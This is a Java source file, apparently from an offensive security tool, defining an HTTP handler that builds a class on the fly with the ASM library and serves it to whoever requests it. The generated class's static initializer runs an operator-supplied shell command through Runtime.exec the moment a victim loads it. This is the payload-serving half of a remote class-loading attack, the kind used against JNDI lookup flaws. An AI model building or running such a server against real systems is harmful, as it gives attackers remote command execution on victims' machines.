package org.sec.core.http;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;

import java.io.IOException;
import java.io.OutputStream;

import static org.objectweb.asm.Opcodes.*;

@SuppressWarnings("all")
public class CommandHandler implements HttpHandler {
    private final String cmd;
    private final String className;

    public CommandHandler(String cmd, String className) {
        this.cmd = cmd;
        this.className = className;
    }

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        MethodVisitor methodVisitor;
        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, className, null,
                "java/lang/Object", null);
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V",
                null, null);
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>",
                "()V", false);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(1, 1);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>", "()V",
                null, null);
        methodVisitor.visitCode();
        Label label0 = new Label();
        Label label1 = new Label();
        Label label2 = new Label();
        methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
        methodVisitor.visitLabel(label0);
        methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                "()Ljava/lang/Runtime;", false);
        methodVisitor.visitLdcInsn(cmd);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                "(Ljava/lang/String;)Ljava/lang/Process;", false);
        methodVisitor.visitInsn(POP);
        methodVisitor.visitLabel(label1);
        Label label3 = new Label();
        methodVisitor.visitJumpInsn(GOTO, label3);
        methodVisitor.visitLabel(label2);
        methodVisitor.visitVarInsn(ASTORE, 0);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Exception",
                "printStackTrace", "()V", false);
        methodVisitor.visitLabel(label3);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(2, 1);
        methodVisitor.visitEnd();

        classWriter.visitEnd();
        byte[] data = classWriter.toByteArray();
        exchange.sendResponseHeaders(200, 0);
        OutputStream os = exchange.getResponseBody();
        os.write(data);
        os.close();
    }
}
